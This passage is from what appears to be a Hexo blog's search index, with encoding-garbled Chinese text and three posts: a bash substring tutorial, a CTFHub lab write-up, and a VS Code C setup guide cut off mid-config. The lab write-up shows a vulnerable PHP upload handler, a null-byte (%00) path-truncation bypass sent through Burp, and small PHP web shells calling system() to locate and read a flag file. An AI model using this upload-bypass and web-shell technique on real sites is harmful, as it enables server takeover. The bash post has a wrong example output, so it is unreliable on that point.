    <url>/2020/04/19/shell%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96/</url>
    <content><![CDATA[<h2 id="ä½¿ç”¨-å·æˆªå–å³è¾¹å­—ç¬¦"><a href="#ä½¿ç”¨-å·æˆªå–å³è¾¹å­—ç¬¦" class="headerlink" title="ä½¿ç”¨ # å·æˆªå–å³è¾¹å­—ç¬¦"></a>ä½¿ç”¨ # å·æˆªå–å³è¾¹å­—ç¬¦</h2><p>æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;url#*childStr&#125;</span><br></pre></td></tr></table></figure>

<p>childStrå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–è€…æ˜¯ç‰¹å®šå­—ç¬¦ï¼Œå°†è¿”å›åŒ¹é…<strong>ç¬¬ä¸€ä¸ª</strong><code>childStr</code>åçš„å­—ç¬¦ä¸²<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file_name="test.txt"</span><br><span class="line">echo $&#123;file_name#*.&#125;</span><br></pre></td></tr></table></figure>

<p>å°†è¾“å‡º<code>txt</code></p>
<p>å¦‚æœå¸Œæœ›åŒ¹é…<strong>æœ€åä¸€ä¸ª</strong><code>childStr</code>åçš„å­—ç¬¦ä¸²,å¯ä»¥ä½¿ç”¨<code>##</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_name&#x3D;&quot;test.tar.gz&quot;</span><br><span class="line">echo $&#123;file_name##*.&#125;</span><br></pre></td></tr></table></figure>

<p>å°†è¿”å›<code>gz</code></p>
<h2 id="ä½¿ç”¨-å·æˆªå–å·¦è¾¹å­—ç¬¦"><a href="#ä½¿ç”¨-å·æˆªå–å·¦è¾¹å­—ç¬¦" class="headerlink" title="ä½¿ç”¨ % å·æˆªå–å·¦è¾¹å­—ç¬¦"></a>ä½¿ç”¨ % å·æˆªå–å·¦è¾¹å­—ç¬¦</h2><p>æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;url%childStr*&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">file_name="test.tar.gz"</span><br><span class="line">echo $&#123;file_name%.*&#125;</span><br><span class="line">echo $&#123;file_name%%.*&#125;</span><br></pre></td></tr></table></figure>

<p>å°†è¾“å‡º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.tar</span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<h2 id="æˆªå–æŒ‡å®šä¸ªæ•°å­—ç¬¦ä¸²"><a href="#æˆªå–æŒ‡å®šä¸ªæ•°å­—ç¬¦ä¸²" class="headerlink" title="æˆªå–æŒ‡å®šä¸ªæ•°å­—ç¬¦ä¸²"></a>æˆªå–æŒ‡å®šä¸ªæ•°å­—ç¬¦ä¸²</h2><ul>
<li><p>ä»å­—ç¬¦ä¸²å·¦è¾¹</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">str="abcdefghijkl"</span><br><span class="line">echo $&#123;str:2:100&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º<code>cdefg</code>ï¼Œå³è¾“å‡ºä»<code>startIndex</code>å¼€å§‹é•¿åº¦æ˜¯<code>length</code>çš„å­—ç¬¦ä¸²ï¼Œå½“<code>length</code>è¶…å‡ºæœ€åä¸€ä¸ªå…ƒç´ çš„ç•Œé™æˆ–è€…æ˜¯ç¼ºçœæ—¶å°†è¾“å‡ºä»<code>startIndex</code>ç›´è‡³æœ«å°¾ã€‚</p>
</li>
<li><p>ä»å­—ç¬¦ä¸²å³è¾¹</p>
<p>é€šå¸¸çš„è¯­æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;string: 0-startIndex :length&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;abcdefghijkl&quot;</span><br><span class="line">echo $&#123;str:0-7:3&#125;</span><br></pre></td></tr></table></figure>

<p>å°†è¾“å‡º<code>fgh</code>ï¼Œå› ä¸ºä»å³è¾¹å¾€å·¦è¾¹æ•°ï¼Œcï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;abcdefghijkl&quot;</span><br><span class="line">echo $&#123;str:1-7:3&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶çš„è¾“å‡ºå°±å˜æˆäº†ï¼š<code>ghi</code>,å¯ä»¥è¿™æ ·ç†è§£ï¼šç¬¬ä¸ƒä¸ªå­—ç¬¦æ˜¯<code>f</code>ï¼Œç„¶åå†å¾€ååç§»ä¸€ä¸ªå­—ç¬¦ï¼Œå†ä»è¿™é‡Œå¼€å§‹æˆªå–ä¸‰ä¸ªå­—ç¬¦ã€‚</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linuxç›¸å…³</category>
      </categories>
      <tags>
        <tag>å­—ç¬¦ä¸²</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>phpæ–‡ä»¶ä¸Šä¼ 00æˆªæ–­</title>
    <url>/2022/06/25/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A000%E6%88%AA%E6%96%AD/</url>
    <content><![CDATA[<p><code>0x00</code>ï¼Œ<code>%00</code>ï¼Œ<code>/00</code>ä¹‹ç±»çš„æˆªæ–­ï¼Œæœ¬è´¨éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯ä¸åŒçš„è¡¨ç¤ºå½¢å¼è€Œå·²ã€‚å°±æ¯”å¦‚å¥³æœ‹å‹ã€å¥³ç¥¨ã€‚</p>
<p>åœ¨ç½‘ç«™<code>url</code>ä¸­ï¼Œ<code>%00</code>ä¼šè¢«è§£ç æˆ0ï¼Œè€Œåœ¨<code>ascii</code>ä¸­ï¼Œ0æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼ˆå¹¶ä¸æ˜¯å­—ç¬¦<code>&#39;0&#39;</code>ï¼‰ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸï¼Œå› æ­¤å¦‚æœ<code>url</code>ä¸­å‡ºç°äº†<code>%00</code>ï¼Œåˆ™æ„å‘³ç€è§£ç å®Œæ¯•ã€‚</p>
<a id="more"></a>

<p>å¦‚ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://www.yalexin/?file=test.txt</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶è¾“å‡ºçš„æ˜¯<code>test.txt</code></p>
<p>å¦‚æœæ¢æˆï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://www.yalexin/?file=test.php%00.txt</span><br></pre></td></tr></table></figure>

<p>åˆ™æ­¤æ—¶è¾“å‡ºçš„æ˜¯<code>test.php</code></p>
<p>è®©æˆ‘ä»¬æ¥çœ‹ä¸€é“ä¾‹é¢˜ï¼š</p>
<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhub æŠ€èƒ½æ ‘-web-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­</a></p>
<p>æ‰“å¼€åœºæ™¯åæ˜¯ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ï¼ŒæŸ¥çœ‹æºä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'ä¸Šä¼ æˆåŠŸ'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST['submit'])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES['file']['name']);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info['extension'];</span></span><br><span class="line"><span class="comment">    $whitelist = array("jpg", "png", "gif");</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo "&lt;script&gt;alert('ä¸Šä¼ æˆåŠŸ')&lt;/script&gt;";</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo "&lt;script&gt;alert('ä¸Šä¼ å¤±è´¥')&lt;/script&gt;";</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo "æ–‡ä»¶ç±»å‹ä¸åŒ¹é…";</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æºä»£ç ä¸­ï¼Œå…ˆæ˜¯çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ç±»å‹æ˜¯ä¸æ˜¯åœ¨ç™½åå•å†…ï¼ˆå³åªèƒ½ä¸Šä¼ å›¾ç‰‡ç±»å‹ï¼‰ï¼Œæ–‡ä»¶ç±»å‹é€šè¿‡ä»¥åï¼Œè§£æ<code>road</code>å‚æ•°å€¼ï¼Œç„¶åæ‹¼æ¥åˆ°ä¸€ä¸ªéšæœºæ•°å­—ä»¥åŠæ—¥æœŸä½œä¸ºæ–‡ä»¶åå¹¶ä¸Šä¼ åˆ°æŒ‡å®šç›®å½•ã€‚</p>
<p>ç»è¿‡ç®€å•åœ°åˆ†æä»¥åï¼Œå¤§æ¦‚çŸ¥é“äº†æ€è·¯ï¼šä½¿ç”¨ä»£ç†ï¼Œå†™ä¸€ä¸ª<code>php</code>è„šæœ¬ï¼Œå°†å…¶æ‰©å±•åæ”¹ä¸ºå›¾ç‰‡ç±»å‹ï¼Œç„¶åæˆªå–æ•°æ®åŒ…ã€ä¿®æ”¹æ•°æ®åŒ…ï¼Œè®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„è„šæœ¬ã€‚</p>
<p>é¦–å…ˆæŸ¥æ‰¾<code>flag</code>å¯èƒ½çš„ä½ç½®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">'find / | grep flag'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†å…¶æ–‡ä»¶ä¿å­˜ä¸º<code>hack.png</code></p>
<p>ç„¶åå¼€å¯ä»£ç†ï¼Œæ‰“å¼€<code>Burp Suite</code>è½¯ä»¶ï¼Œå¹¶å°†æ‹¦æˆªå™¨ï¼ˆ<code>intercept</code>ï¼‰æ‰“å¼€</p>
<p> åœ¨æµè§ˆå™¨ä¸­ä¸Šä¼ æˆ‘ä»¬åˆšåˆšçš„<code>hack.png</code></p>
<p>ç„¶åæˆ‘ä»¬ä¼šåœ¨<code>Burp</code>ä¸­çœ‹åˆ°è¯¥æ•°æ®æŠ¥ï¼Œæˆ‘ä»¬å°è¯•å°†</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?road=/var/www/html/upload/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸ºï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?road=/var/www/html/upload/hack.php%00</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>ç„¶åç‚¹å‡»<code>forward</code></p>
<p>ä¸Šä¼ æˆåŠŸä»¥åï¼Œæˆ‘ä»¬è®¿é—®è¯¥è„šæœ¬ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/upload/hack.php</span><br></pre></td></tr></table></figure>

<p>æœç„¶çœ‹åˆ°äº†ä¸€äº›å†…å®¹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags /sys/devices/platform/serial8250/tty/ttyS1/flags /sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags /sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/dummy0/flags /sys/module/scsi_mod/parameters/default_dev_flags /proc/kpageflags /usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al /usr/lib/perl/5.14.2/bits/waitflags.ph /var/www/html/flag_139938352.php</span><br></pre></td></tr></table></figure>

<p>æœ€åçš„å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚è¦è¯»å–è¯¥æ–‡ä»¶ã€‚</p>
<p>ä¿®æ”¹æˆ‘ä»¬çš„è„šæœ¬<code>hack.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">'cat ../flag_139938352.php'</span>)<span class="comment">//æ³¨æ„ï¼Œè¯¥è„šæœ¬æœ€ç»ˆä¼šä¸Šä¼ åˆ°/var/www/html/upload æ–‡ä»¶å¤¹ä¸‹ï¼Œå› æ­¤è¦å›åˆ°ä¸Šä¸€çº§ç›®å½•è¯»å– flag</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§åˆšåˆšçš„æ–¹æ³•ç»§ç»­ä¸Šä¼ å³å¯è¯»å–è¯¥å†…å®¹ï¼ˆ<strong>æ³¨æ„</strong>ï¼šæˆ‘ä»¬è®¿é—®hack.phpçš„æ—¶å€™ä¼šé‡åˆ°ç©ºç™½é¡µé¢ï¼Œå³é”®æŸ¥çœ‹æºç å³å¯çœ‹åˆ°<code>flag</code>ï¼‰ã€‚</p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>vs codeï¼ˆWindowsï¼‰é…ç½®Cç¯å¢ƒ</title>
    <url>/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œæœ‰ä¸€ä¸ªéå¸¸å¥½ç”¨çš„å·¥å…·ï¼ŒVisual Studio Codeï¼Œç®€ç§°VS codeã€‚  å®ƒæ˜¯å¾®è½¯å‡ºçš„ä¸€æ¬¾è½»é‡çº§ä»£ç ç¼–è¾‘å™¨ï¼Œå…è´¹è€Œä¸”åŠŸèƒ½å¼ºå¤§ï¼Œå¯¹JavaScriptå’ŒNodeJSçš„æ”¯æŒéå¸¸å¥½ï¼Œè‡ªå¸¦å¾ˆå¤šåŠŸèƒ½ï¼Œä¾‹å¦‚ä»£ç æ ¼å¼åŒ–ï¼Œä»£ç æ™ºèƒ½æç¤ºè¡¥å…¨ã€Emmetæ’ä»¶ç­‰ã€‚ æ— æ•°ä¸ªå¤§è¨€ä¸æƒ­çš„æ”»åŸç‹®ï¼Œéƒ½è¢«VS codeæ¯”å¾·èŠ™è¿˜ä¸æ»‘çš„å¼ºå¤§åŠŸèƒ½æ‰€æŠ˜æœã€‚ æœ¬ç¯‡æ–‡ç« ä¸»è¦æ˜¯ä»‹ç»å¦‚ä½•é…ç½®Windowsç³»ç»Ÿä¸‹Cç¯å¢ƒçš„é…ç½®ï¼ŒC++çš„é…ç½®ç±»ä¼¼ï¼Œè¿™é‡Œå°±ä¸å†é‡å¤ã€‚</p>
<a id="more"></a>

<h2 id="1-ä¸‹è½½vs-code"><a href="#1-ä¸‹è½½vs-code" class="headerlink" title="1.ä¸‹è½½vs code"></a>1.ä¸‹è½½vs code</h2><p>è¿™é‡Œç»™å‡º<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">å®˜ç½‘é“¾æ¥</a></p>
<h2 id="2-ä¸‹è½½mingw"><a href="#2-ä¸‹è½½mingw" class="headerlink" title="2.ä¸‹è½½mingw"></a>2.ä¸‹è½½mingw</h2><p>è¿™é‡Œç»™å‡º<a href="http://mingw.org/" target="_blank" rel="noopener">å®˜ç½‘é“¾æ¥</a>ï¼Œå¦‚æœå®˜ç½‘ä¸‹è½½å¤ªæ…¢ï¼Œä¹Ÿå¯ä»¥<a href="i686-8.1.0-release-posix-dwarf-rt_v6-rev0.7z">ç‚¹æ­¤ä¸‹è½½</a>ï¼Œç„¶åè§£å‹åˆ°è‡ªå·±å–œæ¬¢çš„åœ°æ–¹ï¼Œä½†æœ€å¥½è·¯å¾„ä¸­ä¸è¦å«æœ‰ä¸­æ–‡ã€‚</p>
<h2 id="3-ä¸‹è½½æ’ä»¶"><a href="#3-ä¸‹è½½æ’ä»¶" class="headerlink" title="3.ä¸‹è½½æ’ä»¶"></a>3.ä¸‹è½½æ’ä»¶</h2><ul>
<li><p>cpptools</p>
<p>  ä¸‹è½½ä¸äº†çš„å¯ä»¥ä»è¿™é‡Œä¸‹è½½<a href="http://q78fmp2j4.bkt.clouddn.com/cpptools-win32.vsix" target="_blank" rel="noopener">ç¦»çº¿åŒ…</a>ï¼Œåœ¨vs codeä¸­é€‰æ‹©â€œä»VSIXå®‰è£…â€å³å¯</p>
</li>
<li><p>Chinese (Simplified) Languageï¼ˆå¯é€‰ï¼‰</p>
</li>
<li><p>Bracket Pair Colorizerï¼ˆå¯é€‰ï¼‰</p>
</li>
</ul>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307102836.png" class>

<h2 id="4-é…ç½®ç¯å¢ƒ"><a href="#4-é…ç½®ç¯å¢ƒ" class="headerlink" title="4.é…ç½®ç¯å¢ƒ"></a>4.é…ç½®ç¯å¢ƒ</h2><ol>
<li><p>æ–°å»ºæµ‹è¯•æ–‡ä»¶test.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description: </span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-03-07 10:31:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-03-07 10:31:47</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>é…ç½®launch.json</p>
<p>ç¼–å†™å®Œæ¯•ä¸Šé¢çš„ä»£ç ï¼Œç„¶åæŒ‰ä¸‹F5ï¼Œå¼¹å‡ºé€‰æ‹©ç¯å¢ƒ</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307103653.png" class>

<p>è¿™é‡Œé€‰æ‹©ç¬¬ä¸€ä¸ªï¼Œç„¶åé€‰æ‹©é»˜è®¤é…ç½®</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307103911.png" class>

<p>ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆlaunch.jsonï¼Œæ¥ç€æŠŠä¸‹é¢çš„ä»£ç ç²˜è´´è¦†ç›–è¿›å»å³å¯ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="string">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"C++ Launch (GDB)"</span>,                 <span class="comment">// é…ç½®åç§°ï¼Œå°†ä¼šåœ¨å¯åŠ¨é…ç½®çš„ä¸‹æ‹‰èœå•ä¸­æ˜¾ç¤º</span></span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"cppdbg"</span>,                           <span class="comment">// é…ç½®ç±»å‹ï¼Œè¿™é‡Œåªèƒ½ä¸ºcppdbg</span></span><br><span class="line">            <span class="string">"request"</span>: <span class="string">"launch"</span>,                        <span class="comment">// è¯·æ±‚é…ç½®ç±»å‹ï¼Œå¯ä»¥ä¸ºlaunchï¼ˆå¯åŠ¨ï¼‰æˆ–attachï¼ˆé™„åŠ ï¼‰</span></span><br><span class="line">            <span class="string">"launchOptionType"</span>: <span class="string">"Local"</span>,                <span class="comment">// è°ƒè¯•å™¨å¯åŠ¨ç±»å‹ï¼Œè¿™é‡Œåªèƒ½ä¸ºLocal</span></span><br><span class="line">            <span class="string">"targetArchitecture"</span>: <span class="string">"x86"</span>,                <span class="comment">// ç”Ÿæˆç›®æ ‡æ¶æ„ï¼Œä¸€èˆ¬ä¸ºx86æˆ–x64ï¼Œå¯ä»¥ä¸ºx86, arm, arm64, mips, x64, amd64, x86_64</span></span><br><span class="line">            <span class="string">"program"</span>:   <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>,                   <span class="comment">// å°†è¦è¿›è¡Œè°ƒè¯•çš„ç¨‹åºçš„è·¯å¾„</span></span><br><span class="line">            <span class="string">"miDebuggerPath"</span>:<span class="string">"D:/mingw32/bin/gdb.exe"</span>, <span class="comment">// ******************miDebuggerçš„è·¯å¾„ï¼Œæ³¨æ„è¿™é‡Œè¦ä¸MinGwçš„è·¯å¾„å¯¹åº”</span></span><br><span class="line">            <span class="string">"args"</span>: [],     <span class="comment">// ç¨‹åºè°ƒè¯•æ—¶ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°ï¼Œä¸€èˆ¬è®¾ä¸ºç©ºå³å¯</span></span><br><span class="line">            <span class="string">"stopAtEntry"</span>: <span class="literal">false</span>,                       <span class="comment">// è®¾ä¸ºtrueæ—¶ç¨‹åºå°†æš‚åœåœ¨ç¨‹åºå…¥å£å¤„ï¼Œä¸€èˆ¬è®¾ç½®ä¸ºfalse</span></span><br><span class="line">            <span class="string">"cwd"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span>,                  <span class="comment">// è°ƒè¯•ç¨‹åºæ—¶çš„å·¥ä½œç›®å½•ï¼Œä¸€èˆ¬ä¸º$&#123;workspaceRoot&#125;å³ä»£ç æ‰€åœ¨ç›®å½•</span></span><br><span class="line">            <span class="string">"externalConsole"</span>: <span class="literal">true</span>,                    <span class="comment">// è°ƒè¯•æ—¶æ˜¯å¦æ˜¾ç¤ºæ§åˆ¶å°çª—å£ï¼Œä¸€èˆ¬è®¾ç½®ä¸ºtrueæ˜¾ç¤ºæ§åˆ¶å°</span></span><br><span class="line">            <span class="string">"preLaunchTask"</span>: <span class="string">"gcc"</span>ã€€ã€€                  <span class="comment">// *********è°ƒè¯•ä¼šè¯å¼€å§‹å‰æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬ä¸ºç¼–è¯‘ç¨‹åºï¼Œc++ä¸ºg++, cä¸ºgcc</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ¥ç€å°†miDebuggerPathçš„å€¼æ”¹ä¸ºä½ çš„MinGwè·¯å¾„ã€‚</strong></p>
</li>
<li><p>é…ç½®tasks.json</p>
<p>å›åˆ°test.cï¼ŒæŒ‰ä¸‹F5ï¼Œä½ ä¼šå‘ç°è¿˜æ˜¯ä¸èƒ½ç¼–è¯‘è¿è¡Œæˆ‘ä»¬çš„ç¨‹åºï¼Œåˆ«æ€¥ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é…ç½®tasks.jsonï¼Œ</p>
<p>ç‚¹å‡»å¼¹å‡ºæ¥çš„ä¿¡æ¯æ¡†ä¸­çš„â€œé…ç½®ä»»åŠ¡â€</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104828.png" class>

<p>é€‰æ‹©â€œä½¿ç”¨æ¨¡æ¿â€</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104850.png" class>

<p>é€‰æ‹©ç¬¬ä¸€ä¸ª</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104917.png" class>

<p>ç„¶ååœ¨ç”Ÿæˆçš„tasksä¸­ç²˜è´´è¦†ç›–ä¸‹é¢çš„ä»£ç å³å¯</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"2.0.0"</span>,</span><br><span class="line">    <span class="attr">"tasks"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>,</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"group"</span>: &#123;</span><br><span class="line">                <span class="attr">"kind"</span>: <span class="string">"build"</span>,</span><br><span class="line">                <span class="attr">"isDefault"</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"presentation"</span>: &#123;</span><br><span class="line">                <span class="attr">"echo"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">"reveal"</span>: 